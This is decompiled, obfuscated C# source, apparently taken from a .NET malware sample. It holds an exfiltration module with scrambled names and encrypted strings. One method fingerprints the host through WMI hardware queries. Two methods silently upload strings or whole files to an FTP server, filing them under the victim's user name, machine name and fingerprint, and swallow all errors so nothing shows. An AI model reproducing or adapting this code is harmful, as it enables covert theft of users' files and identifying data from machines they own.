using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace orBiLhAbVg;

internal sealed class cjKqlcIRmlYL
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string aZOinZNueMSqVQA()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107409823));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107409258)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107409273);
		ManagementObject val3 = new ManagementObject(getString_0(107409236) + text2 + getString_0(107409195));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107409222)).ToString();
		return text3 + text;
	}

	public static void PZwksmFnrvdllwo(string ALjEZGvOoBDGHz = "URL", string yWueQviKyfad = "USERNAME", string ckzSQtUvkhVSMM = "ACCESO", string zxWlQGdGsYtsPJx = "")
	{
		try
		{
			string text = aZOinZNueMSqVQA();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ALjEZGvOoBDGHz + getString_0(107410377) + Environment.UserName + getString_0(107410396) + Environment.MachineName + getString_0(107410375) + text + getString_0(107410370));
			ftpWebRequest.Method = getString_0(107409165);
			ftpWebRequest.Credentials = new NetworkCredential(yWueQviKyfad, ckzSQtUvkhVSMM);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(zxWlQGdGsYtsPJx);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void xPWVYXQJNasgW(string IXkbymrzFwcMG = "URL", string bjYdfcSiiOmxjh = "USERNAME", string KZnzzFqgUOoz = "ACCESO", string oYZsQPceCTjF = "")
	{
		try
		{
			string text = aZOinZNueMSqVQA();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(IXkbymrzFwcMG + getString_0(107410377) + Environment.UserName + getString_0(107410396) + Environment.MachineName + getString_0(107410375) + text + getString_0(107410375) + Path.GetFileName(oYZsQPceCTjF));
			ftpWebRequest.Method = getString_0(107409165);
			ftpWebRequest.Credentials = new NetworkCredential(bjYdfcSiiOmxjh, KZnzzFqgUOoz);
			byte[] array = File.ReadAllBytes(oYZsQPceCTjF);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static cjKqlcIRmlYL()
	{
		Strings.CreateGetStringDelegate(typeof(cjKqlcIRmlYL));
	}
}
